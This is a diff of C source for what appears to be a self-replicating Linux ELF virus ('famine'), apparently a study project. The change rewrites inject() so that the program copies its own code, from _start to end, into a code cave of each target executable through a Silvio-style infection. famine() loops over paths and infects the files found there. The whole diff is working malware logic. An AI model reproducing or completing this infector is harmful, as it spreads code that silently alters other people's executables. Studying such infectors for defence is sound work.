@@ -58,37 +58,21 @@ int	calculate_jmp(t_data *data, size_t payload_size) {
 
 	return 0;
 }
-
-char *text_section(t_data *data) {
-	Elf64_Shdr *shdr = data->elf.shdr;
-	Elf64_Ehdr *ehdr = data->elf.ehdr;
-
-	for (int i = 0; i < ehdr->e_shnum; i++) {
-		if (shdr[i].sh_type == SHT_PROGBITS && shdr[i].sh_flags == (SHF_ALLOC | SHF_EXECINSTR)) {
-
-			char *map = (char *)_syscall(SYS_mmap, NULL, shdr[i].sh_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-			if (map == MAP_FAILED)
-				return NULL;
-			ft_memcpy(map, data->file + shdr[i].sh_offset, shdr[i].sh_size);
-			return map;
-			//return (char *)(data->file + shdr[i].sh_offset);
-		}
-	}
-	return NULL;
-}
 	
 
 int	inject(t_data *data) {
 
 	//char *text = text_section(data);
+	
+	unsigned long size =  (char *)&end - (char *)&_start;
 
-	silvio(data, g_payload_size);
+	silvio(data, size);
 
-	calculate_jmp(data, g_payload_size);
+	//calculate_jmp(data, g_payload_size);
+	//
+	//modify_payload(data->cave.rel_jmp, JMP_OFFSET, sizeof(data->cave.rel_jmp), (uint8_t *)g_payload, g_payload_size);
 
-	modify_payload(data->cave.rel_jmp, JMP_OFFSET, sizeof(data->cave.rel_jmp), (uint8_t *)g_payload, g_payload_size);
-
-	ft_memcpy(data->file + data->cave.offset, g_payload, g_payload_size);
+	ft_memcpy(data->file + data->cave.offset, _start, size);
 
 	patch_new_file(data);
 
@@ -161,11 +145,5 @@ void	famine(void)
 
 	for (int i = 0; paths[i]; i++)
 		open_file(paths[i]);
-
-	char tmp[] = "yolo";
-	_syscall(SYS_write, 1, tmp, ft_strlen(tmp));
-
-
-	unsigned long size =  (char *)&end - (char *)&_start;
 
 }
